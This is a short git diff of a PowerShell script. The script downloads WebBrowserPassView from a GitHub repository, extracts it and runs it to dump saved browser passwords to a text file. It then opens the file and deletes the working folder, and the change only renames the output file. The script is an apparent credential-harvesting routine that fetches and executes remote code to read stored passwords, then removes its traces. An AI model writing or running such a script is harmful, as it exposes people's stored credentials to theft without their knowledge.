@@ -11,8 +11,8 @@ $unzipFolder="$newDir\$nameFile"
 Invoke-WebRequest -Uri "https://github.com/MaxAxoft/demo/raw/main/WebBrowserPassView.zip" -Method Get -OutFile $zipFolder
 Expand-Archive $zipFolder -DestinationPath $unzipFolder
 
-cmd /c "WebBrowserPassView\WebBrowserPassView.exe /stext test.txt"
-test.txt
+cmd /c "WebBrowserPassView\WebBrowserPassView.exe /stext export.txt"
+export.txt
 
 Remove-Item -Path $newDir
 
